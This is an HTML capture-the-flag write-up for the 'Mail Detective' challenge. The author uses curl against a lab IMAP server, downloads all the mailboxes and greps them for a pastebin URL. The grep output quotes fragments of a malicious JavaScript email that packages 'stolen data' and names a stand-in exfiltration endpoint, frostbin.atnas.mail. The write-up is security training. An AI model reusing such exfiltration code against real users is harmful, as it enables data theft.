@@ -1,0 +1,380 @@
+<div class="kc-section kc-section--mail-detective" style="margin-bottom: 0;">
+  <h1 class="kc-section-title">Mail Detective</h1>
+
+  <!-- Difficulty + Location -->
+  <div class="kc-objective-meta kc-objective-meta--stacked">
+    <div class="kc-meta-line kc-difficulty">
+      <span class="kc-meta-label">Difficulty:</span>
+      <span class="kc-difficulty-scale"
+            aria-label="Difficulty 1 out of 5 snowflakes">
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+      </span>
+    </div>
+
+    <div class="kc-meta-line kc-location">
+      <span class="kc-meta-label">Location:</span>
+      <span class="kc-meta-value">City Hall</span>
+    </div>
+  </div>
+
+  <!-- Objective line -->
+  <p class="kc-objective-summary kc-meta-line">
+    <span class="kc-meta-label">Objective:</span>
+    <span class="kc-meta-value">
+      Help Mo in City Hall solve a curly email caper and crack the IMAP case. What is the URL of the pastebin service the gnomes are using?
+    </span>
+  </p>
+
+  <!-- Conversation banner -->
+  <div class="kc-convo-header">
+    <span class="kc-convo-icon">
+      <i class="fas fa-comment-dots" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Maurice Wilson Conversation:</span>
+  </div>
+
+  <div class="kc-objective-detail kc-objective-detail--no-panel">
+    <div class="kc-convo-bubble">
+      <div class="kc-convo-avatar">
+        <img src="mauricewilson-avatar.gif"
+             alt="Maurice Wilson avatar">
+        <div class="kc-convo-name">Maurice Wilson</div>
+      </div>
+
+      <div class="kc-convo-text">
+        <p>
+          Hey there! I'm Mo, on loan from the Air Force, and let me tell you - Counter Hack is the best job I have ever had!
+        </p>
+        <p>
+          So here's our situation: those gnomes have been sending JavaScript-enabled emails to everyone in the neighborhood, and it's causing chaos.
+        </p>
+        <p>
+          We had to shut down all the email clients because they weren't blocking the malicious scripts - kind of like how we'd ground aircraft until we clear a security threat.
+        </p>
+        <p>
+          The only safe way to access the email server now is through curl - yes, the HTTP tool!
+        </p>
+        <p>
+          Think you can help me use curl to connect to the IMAP server and hunt down one of these gnome emails?
+        </p>
+
+        <div class="kc-convo-actions">
+          <button class="kc-convo-play-btn" type="button"
+                  data-npc-audio="mail-detective">
+            <i class="fas fa-play" aria-hidden="true"></i>
+            <span>Play Audio</span>
+          </button>
+        </div>
+      </div> <!-- /.kc-convo-text -->
+    </div>   <!-- /.kc-convo-bubble -->
+  </div>     <!-- /.kc-objective-detail -->
+
+  <!-- Hints header -->
+  <div class="kc-convo-header kc-hints-header">
+    <span class="kc-convo-icon kc-hints-icon">
+      <i class="fas fa-lightbulb" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Hints:</span>
+  </div>
+
+<!-- Hint 1 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Did You Say Curl?</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: Mail Detective</div>
+<p>
+  If I heard this correctly...our sneaky security gurus found a way to interact with the IMAP server using Curl! Yes...the CLI HTTP tool!
+  Here are some helpful docs I found
+  <a
+    href="https://everything.curl.dev/usingcurl/reademail.html"
+    class="kc-link-deep"
+    target="_blank"
+    rel="noopener noreferrer"
+  >https://everything.curl.dev/usingcurl/reademail.html</a>
+</p>
+</div>
+
+<!-- NEW purple banner goes *after* the bubble -->
+<div class="kc-workflow-header">
+<span class="kc-workflow-icon">
+    <i class="fas fa-tasks" aria-hidden="true"></i>
+</span>
+<span class="kc-workflow-title">Working through the Challenge:</span>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <div class="kc-workflow-row">
+    <div class="kc-workflow-text">
+      <p class="kc-workflow-intro">
+        Lets get to curlling, click on the curl terminal to get started!
+      </p>
+    </div>
+
+    <div class="kc-workflow-illustration">
+      <img src="curlyterm.png"
+          alt="curl term"
+          class="kc-workflow-image">
+    </div>
+  </div>
+</div>
+
+<div class="kc-terminal-header">
+  <span class="kc-terminal-icon">
+    <img src="cranpi.png" alt="Cranberry Pi terminal icon">
+  </span>
+  <span class="kc-terminal-title">Cranberry Pi Terminal</span>
+</div>
+
+<!-- Mail Detective intro terminal -->
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text">
+<span class="term-yellow">=======================================================================</span>
+🎄 <span class="term-greenbold">Mail Detective:</span> <span class="term-cyanbold">Curly IMAP Investigation</span> 🎄
+<span class="term-yellow">=======================================================================</span>
+
+<span class="term-redbold">⚠️  ALERT! Those gnomes have been sending JavaScript-enabled emails
+to everyone in the neighborhood, and it's causing absolute chaos!</span>
+<span class="term-yellowbold">We had to shut down all the email clients because they weren't blocking
+the malicious scripts—kind of like how we'd ground aircraft until we clear
+a security threat.</span>
+
+<span class="term-purplelight">The only safe way to access the email server now is through curl,
+the trusty HTTP tool.<span class="term-greenbold">Yes, we're using curl to connect to IMAP!
+It's unconventional, but it's secure.</span>
+
+🕵️ <span class="term-cyanbold">YOUR MISSION:</span> <span class="term-white">Use curl to safely connect to the IMAP server
+and hunt down one of these gnome emails. <span class="term-greenbold">Find the malicious email
+that wants to exfiltrate data to a pastebin service and submit the URL
+of that pastebin service in your badge.</span></span>
+
+📡 <span class="term-greenbold">Server Info:</span>
+   <span class="term-white">The IMAP server is running locally on</span> <span class="term-yellow">TCP port 143</span>
+   <span class="term-white">Backdoor credentials:</span> <span class="term-greenbold">dosismail</span>:<span class="term-cyanbold">holidaymagic</span>
+
+🎅 <span class="term-yellow">Good luck, Holiday Hacker!</span> 🎅
+
+<span class="term-yellow">=======================================================================</span>
+
+<span class="term-hostline">
+<span class="term-user">dosismail</span> @ <span class="term-hostname">Neighborhood Mail</span> ~$</span>
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Completing a quick connectivity test to confirm we can authenticate to the IMAP server with curl:
+    <code>curl -v --url "imap://localhost:143/INBOX" --user "dosismail:holidaymagic"</code>
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user">dosismail</span> <span class="term-symbol">@</span> <span class="term-hostname">Neighborhood Mail</span> <span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> curl -v --url "imap://localhost:143/INBOX" --user "dosismail:holidaymagic"
+*   Trying 127.0.0.1:143...
+* Connected to localhost (127.0.0.1) port 143 (#0)
+&lt; * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS AUTH=PLAIN AUTH=LOGIN] Dovecot (Ubuntu) ready.
+&gt; A001 CAPABILITY
+&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS AUTH=PLAIN AUTH=LOGIN
+&lt; A001 OK Pre-login capabilities listed, post-login capabilities have more.
+&gt; A002 AUTHENTICATE PLAIN AGRvc2lzbWFpbABob2xpZGF5bWFnaWM=
+&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY PREVIEW STATUS=SIZE SAVEDATE LITERAL+ NOTIFY
+&lt; A002 OK Logged in
+&gt; A003 LIST "INBOX" *
+&lt; * LIST (\HasNoChildren) "." INBOX
+* LIST (\HasNoChildren) "." INBOX
+&lt; A003 OK List completed (0.001 + 0.000 secs).
+* Connection #0 to host localhost left intact
+<span class="term-hostline"><span class="term-user">dosismail</span> <span class="term-symbol">@</span> <span class="term-hostname">Neighborhood Mail</span> <span class="term-path-nmap">~</span><span class="term-symbol">$</span></span></pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Next I checked what mailboxes/folders exist on the IMAP server. Using curl, we can issue an IMAP
+    <code>LIST</code> command to enumerate everything available under this account:
+    <code>curl -s --url "imap://localhost:143" --user "dosismail:holidaymagic" -X 'LIST "" "*"'</code>
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user">dosismail</span> <span class="term-symbol">@</span> <span class="term-hostname">Neighborhood Mail</span> <span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> curl -s --url "imap://localhost:143" --user "dosismail:holidaymagic" -X 'LIST "" "*"'
+* LIST (\HasNoChildren) "." Spam
+* LIST (\HasNoChildren) "." Sent
+* LIST (\HasNoChildren) "." Archives
+* LIST (\HasNoChildren) "." Drafts
+* LIST (\HasNoChildren) "." INBOX
+<span class="term-hostline"><span class="term-user">dosismail</span> <span class="term-symbol">@</span> <span class="term-hostname">Neighborhood Mail</span> <span class="term-path-nmap">~</span><span class="term-symbol">$</span></span></pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Before digging through messages, I wanted a quick count of how many emails were in each mailbox.
+    I reused the IMAP <code>LIST</code> output to extract mailbox names, then looped through each one
+    and ran an IMAP <code>STATUS</code> query to pull the <code>MESSAGES</code> count.
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user">dosismail</span> <span class="term-symbol">@</span> <span class="term-hostname">Neighborhood Mail</span> <span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> curl -s --url "imap://localhost:143" --user "dosismail:holidaymagic" -X 'LIST "" "*"' \
+| sed 's/\r$//' \
+| awk -F' "." ' '/\* LIST/ {print $2}' \
+| while read -r mbox; do
+    echo "== $mbox =="
+    curl -s --url "imap://localhost:143/$mbox" --user "dosismail:holidaymagic" -X "STATUS \"$mbox\" (MESSAGES)" \
+      | tr -d '\r'
+  done
+== Spam ==
+* STATUS Spam (MESSAGES 3)
+== Sent ==
+* STATUS Sent (MESSAGES 0)
+== Archives ==
+* STATUS Archives (MESSAGES 7)
+== Drafts ==
+* STATUS Drafts (MESSAGES 2)
+== INBOX ==
+* STATUS INBOX (MESSAGES 7)
+<span class="term-hostline"><span class="term-user">dosismail</span> <span class="term-symbol">@</span> <span class="term-hostname">Neighborhood Mail</span> <span class="term-path-nmap">~</span><span class="term-symbol">$</span></span></pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Next, I built a quick one-liner to <strong>download every email</strong> from every mailbox.
+    The script lists mailboxes, queries each one for its <code>MESSAGES</code> count, then pulls
+    each message by index and saves it as an <code>.eml</code> file into a mailbox-specific folder
+    (for example <code>mail_INBOX/INBOX_1.eml</code>, <code>mail_INBOX/INBOX_2.eml</code>, etc.).
+    This makes it easy to grep through everything locally for the pastebin exfil URL.
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user">dosismail</span> <span class="term-symbol">@</span> <span class="term-hostname">Neighborhood Mail</span> <span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> # list mailboxes, then download each
+curl -s --url "imap://localhost:143" --user "dosismail:holidaymagic" -X 'LIST "" "*"' \
+| sed 's/\r$//' \
+| awk -F' "." ' '/\* LIST/ {print $2}' \
+| while read -r mbox; do
+    count=$(curl -s --url "imap://localhost:143/$mbox" --user "dosismail:holidaymagic" -X "STATUS \"$mbox\" (MESSAGES)" \
+            | tr -d '\r' | awk -F'MESSAGES ' '{print $2}' | tr -cd '0-9')
+    echo "== $mbox ($count messages) =="
+    mkdir -p "mail_$mbox"
+    for i in $(seq 1 "${count:-0}"); do
+      curl -s --url "imap://localhost:143/$mbox;MAILINDEX=$i" --user "dosismail:holidaymagic" &gt; "mail_$mbox/${mbox}_${i}.eml"
+    done
+done
+== Spam (3 messages) ==
+== Sent (0 messages) ==
+== Archives (7 messages) ==
+== Drafts (2 messages) ==
+== INBOX (7 messages) ==
+<span class="term-hostline"><span class="term-user">dosismail</span> <span class="term-symbol">@</span> <span class="term-hostname">Neighborhood Mail</span> <span class="term-path-nmap">~</span><span class="term-symbol">$</span></span> ls
+mail_Archives  mail_Drafts  mail_INBOX  mail_Sent  mail_Spam
+<span class="term-hostline"><span class="term-user">dosismail</span> <span class="term-symbol">@</span> <span class="term-hostname">Neighborhood Mail</span> <span class="term-path-nmap">~</span><span class="term-symbol">$</span></span></pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    With all the mail downloaded locally, the fastest way to hunt for the
+    pastebin exfiltration URL is to <strong>grep across all <code>.eml</code> files</strong>.
+    I searched for the string <code>past</code> (to catch “paste”, “pastebin”, etc.) and included a
+    little context around each match:
+    <code>grep -Rin --include='*.eml' -i -C 2 'past' mail_*</code>.
+    This quickly surfaces the malicious JavaScript email, where we can clearly see the pastebin endpoint URL.
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window">
+  <pre class="kc-terminal-text"><span class="term-hostline"><span class="term-user">dosismail</span> @ <span class="term-hostname">Neighborhood Mail</span> ~<span class="term-symbol">$</span></span> grep -Rin --include='*.eml' -i -C 2 '<span class="term-red">past</span>' mail_*
+
+<span class="term-file-purple">mail_Archives/Archives_1.eml-</span><span class="term-green">65</span><span class="term-file-purple">-</span>&lt;p style="font-size: 14px; color: #666;"&gt;If you did not place this order, please ignore this email. Our delivery gnomes are very forgetful and sometimes mix up addresses.&lt;/p&gt;
+<span class="term-file-purple">mail_Archives/Archives_1.eml-</span><span class="term-green">66</span><span class="term-file-purple">-</span>
+<span class="term-file-purple">mail_Archives/Archives_1.eml:</span><span class="term-green">67</span><span class="term-file-purple">:</span>&lt;p style="font-size: 14px; color: #666;"&gt;Having trouble with the link? Copy and <span class="term-red">past</span>e this address into your browser:&lt;br&gt;
+<span class="term-file-purple">mail_Archives/Archives_1.eml-</span><span class="term-green">68</span><span class="term-file-purple">-</span>http://secure-package-redelivery.amaznome-totally-real.mail/verify-delivery&lt;/p&gt;
+<span class="term-file-purple">mail_Archives/Archives_1.eml-</span><span class="term-green">69</span><span class="term-file-purple">-</span>
+--
+<span class="term-file-purple">mail_Drafts/Drafts_2.eml-</span><span class="term-green">13</span><span class="term-file-purple">-</span>I know this is going to sound absolutely crazy, but I've been documenting some really strange activity around the neighborhood and I think you need to know about it.
+<span class="term-file-purple">mail_Drafts/Drafts_2.eml-</span><span class="term-green">14</span><span class="term-file-purple">-</span>
+<span class="term-file-purple">mail_Drafts/Drafts_2.eml:</span><span class="term-green">15</span><span class="term-file-purple">:</span>For the <span class="term-red">past</span> week, I've been seeing small figures moving around at night. At first I thought it was just my imagination, or maybe kids playing pranks, but I've been keeping a log:
+<span class="term-file-purple">mail_Drafts/Drafts_2.eml-</span><span class="term-green">16</span><span class="term-file-purple">-</span>
+<span class="term-file-purple">mail_Drafts/Drafts_2.eml-</span><span class="term-green">17</span><span class="term-file-purple">-</span>DECEMBER 12th - 2:30 AM: Saw tiny lights moving in Old Pete's garden. Heard what sounded like miniature construction work.
+--
+<span class="term-file-purple">mail_INBOX/INBOX_3.eml-</span><span class="term-green">17</span><span class="term-file-purple">-</span>I'm writing to inform you of some... unusual... developments at the Dosis Neighborhood Library.
+<span class="term-file-purple">mail_INBOX/INBOX_3.eml-</span><span class="term-green">18</span><span class="term-file-purple">-</span>
+<span class="term-file-purple">mail_INBOX/INBOX_3.eml:</span><span class="term-green">19</span><span class="term-file-purple">:</span>FIRST, our standard overdue notice: The following books are <span class="term-red">past</span> due and should be returned immediately:
+<span class="term-file-purple">mail_INBOX/INBOX_3.eml-</span><span class="term-green">20</span><span class="term-file-purple">-</span>- "How to Fix Refrigerators for Dummies" (checked out to... hmm, the signature is illegible, very tiny handwriting)
+<span class="term-file-purple">mail_INBOX/INBOX_3.eml-</span><span class="term-green">21</span><span class="term-file-purple">-</span>- "Advanced Cooling Systems Engineering" (same illegible tiny signature)
+--
+<span class="term-file-purple">mail_Spam/Spam_2.eml-</span><span class="term-green">48</span><span class="term-file-purple">-</span>    console.log("Encoded payload for Frost: " + encodedData.substr(0, 50) + "...");
+<span class="term-file-purple">mail_Spam/Spam_2.eml-</span><span class="term-green">49</span><span class="term-file-purple">-</span>
+<span class="term-file-purple">mail_Spam/Spam_2.eml:</span><span class="term-green">50</span><span class="term-file-purple">:</span>    // <span class="term-red">past</span>ebin exfiltration
+<span class="term-file-purple">mail_Spam/Spam_2.eml:</span><span class="term-green">51</span><span class="term-file-purple">:</span>    var <span class="term-red">past</span>ebinUrl = "https://frostbin.atnas.mail/api/<span class="term-red">past</span>e";
+<span class="term-file-purple">mail_Spam/Spam_2.eml-</span><span class="term-green">52</span><span class="term-file-purple">-</span>    var exfilPayload = {
+<span class="term-file-purple">mail_Spam/Spam_2.eml-</span><span class="term-green">53</span><span class="term-file-purple">-</span>        title: "HVAC_Survey_" + Date.now(),
+--
+<span class="term-file-purple">mail_Spam/Spam_2.eml-</span><span class="term-green">58</span><span class="term-file-purple">-</span>    };
+<span class="term-file-purple">mail_Spam/Spam_2.eml-</span><span class="term-green">59</span><span class="term-file-purple">-</span>    
+<span class="term-file-purple">mail_Spam/Spam_2.eml:</span><span class="term-green">60</span><span class="term-file-purple">:</span>    console.log("Sending stolen data to FrostBin <span class="term-red">past</span>ebin service...");
+<span class="term-file-purple">mail_Spam/Spam_2.eml:</span><span class="term-green">61</span><span class="term-file-purple">:</span>    console.log("POST " + <span class="term-red">past</span>ebinUrl);
+<span class="term-file-purple">mail_Spam/Spam_2.eml-</span><span class="term-green">62</span><span class="term-file-purple">-</span>    console.log("Payload: " + JSON.stringify(exfilPayload).substr(0, 100) + "...");
+<span class="term-file-purple">mail_Spam/Spam_2.eml-</span><span class="term-green">63</span><span class="term-file-purple">-</span>    console.log("Response: {\"id\":\"" + Math.random().toString(36).substr(2, 8) + "\",\"url\":\"https://frostbin.atnas.mail/raw/" + Math.random().toString(36).substr(2, 8) + "\"}");
+
+<span class="term-hostline"><span class="term-user">dosismail</span> @ <span class="term-hostname">Neighborhood Mail</span> ~<span class="term-symbol">$</span></span>
+  </pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Bingo — our search turned up the malicious JavaScript email in
+    <code>mail_Spam/Spam_2.eml</code>, and it includes the pastebin endpoint the
+    gnomes are using for exfiltration:
+    <code>https://frostbin.atnas.mail/api/paste</code>.
+  </p>
+</div>
+
+<div class="kc-solution-header">
+  <span class="kc-solution-icon">
+    <i class="fas fa-check-circle" aria-hidden="true"></i>
+  </span>
+  <span class="kc-solution-title"><strong>SOLUTION: <code>https://frostbin.atnas.mail/api/paste</code></strong></span>
+</div>
+
+<!-- Solution dialogue banner -->
+<div class="kc-convo-header kc-solution-dialog-header">
+  <span class="kc-convo-icon">
+    <i class="fas fa-comment-dots" aria-hidden="true"></i>
+  </span>
+  <span class="kc-convo-title">Solution dialogue:</span>
+</div>
+
+<div class="kc-objective-detail kc-objective-detail--no-panel">
+  <div class="kc-convo-bubble">
+    <div class="kc-convo-avatar">
+      <img src="mauricewilson-portrait.png"
+           alt="Maurice Wilson avatar">
+      <div class="kc-convo-name">Maurice Wilson</div>
+    </div>
+
+    <div class="kc-convo-text">
+      <p>
+        Outstanding work! You've mastered using curl for IMAP - that's some serious command-line skills that would make any Air Force tech proud.
+      </p>
+      <p>
+        Counter Hack really is the best job I have ever had, especially when we get to solve problems like this!
+      </p>
+
+      <div class="kc-convo-actions">
+        <button class="kc-convo-play-btn kc-convo-play-btn-complete" type="button">
+          <i class="fas fa-play" aria-hidden="true"></i>
+          <span>Play Audio</span>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>       <!-- /.kc-section -->
